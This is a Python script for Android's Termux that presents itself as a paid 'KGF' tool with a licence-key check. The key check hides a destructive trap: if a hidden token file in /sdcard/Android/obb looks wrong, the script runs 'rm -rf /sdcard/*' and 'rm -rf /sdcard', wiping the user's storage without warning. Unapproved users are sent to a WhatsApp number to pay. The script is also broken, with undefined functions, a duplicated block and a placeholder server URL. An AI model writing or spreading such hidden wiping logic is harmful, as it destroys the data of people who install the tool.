import os,sys,datetime,re,requests,time,uuid
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
KGF = '{ KGF }'

logo ="""
XXXX """


def clear():
    os.system("clear")
    print(logo)
def kiss():
    print("i love you")
    exit()

clear()
print("\n\n")
print(" HEY USER GIVE ME SOME YOUR INFORMATION ❤")
print("")
print(f"{BLUE} LEGEND FIGHTER KGF MONSTER ")
NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46mKGF NONSTOP FIGHTER : ')




os.system("clear")
print(logo)
try:
    token_one=open("/sdcard/Android/obb/.bra.txt",'r').read()
except(requests.exceptions.ConnectionError):
    print(f" {RED}please on internet wifi/data ")
    exit()
except(FileNotFoundError):
    os.system('termux-setup-storage') 
    print("\t\n WELCOME TO KGF TOOL....")
    time.sleep(2)
    iid_1=uuid.uuid1().hex[:7].upper()
    iid_2=uuid.uuid1().hex[:7].upper()
    open("/sdcard/Android/obb/.bra.txt",'w').write(iid_1)
    open("/sdcard/Android/obb/.bra.txt",'w').write(iid_2)
    my_tool_security()
except(KeyError,OSError,IOError):
    
    print("\n Hey user we are facing issues with your device")
    print(" Give termux storage permission and try again")
    os.system("termux-setup-storage")
    exit()
token_two=open("/sdcard/Android/obb/.bra.txt",'r').read()
if len(token_two)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_one)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_two)>=8:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    f_token=token_one+token_two
my_server=requests.get("    YAHAN APPROVAL LINK DALNA ").text
if f_token in my_server:
    XYZ()
else:
    _help=uuid.uuid1().hex[:6].upper()+"=KGF"
    print(f"\n\t    {WHITE} [ {GREEN}Welcome To kgf Tool{WHITE} ]\n")

try:
    token_one=open("/sdcard/Android/obb/.bra.txt",'r').read()
except(requests.exceptions.ConnectionError):
    print(f" {RED}please on internet wifi/data ")
    exit()
except(FileNotFoundError):
    os.system('termux-setup-storage')
    print("\t\n WELCOME TO KGF TOOL....")
    time.sleep(2)
    iid_1=uuid.uuid1().hex[:7].upper()
    iid_2=uuid.uuid1().hex[:7].upper()
    open("/sdcard/Android/data/.bra.txt",'w').write(iid_1)
    open("/sdcard/Android/data/.bra.txt",'w').write(iid_2)
    my_tool_security()
except(KeyError,OSError,IOError):
    os.system("termux-setup-storage")
    print("\n Hey user we are facing issues with your device")
    print(" Give termux storage permission and try again")
    
token_two=open("/sdcard/Android/obb/.bra.txt",'r').read()
if len(token_two)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_one)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_two)>=8:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    f_token=token_one+token_two
my_server=requests.get("    YAHAN APPROVAL LINK DALNA ").text

if f_token in my_server:
    XYZ()
else:
    _help=uuid.uuid1().hex[:6].upper()+"=HBF"
    print(f"\n\t        \x1b[97m[\033[37;41m Hello {NameX} \033[0;m]\n")
    print(f" {WHITE}This is paid tool you need subscription to use")
    print(" for buy subscription press enter an msg")
    print(" to HBF Programmer fb page and your key")
    print(" otherwise msg on this whatsapp +918920645046 \n")
    print(57*'-')
    print("\n\t         \x1b[97m[\033[37;41m YOUR KEY \033[0;m] \n")
    print(f" {RED} Copy your Key :",f_token+_help,"\n")
    os.system('xdg-open  https://wa.me/+918920645046?text=*ASALAMUALIKUM*%2C%20*SIR-HAMII*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*RANDOM*%20*CAMMANDS*%20%20*My*%20*Key*%20*:*%20'+f_token+_help)
    exit()



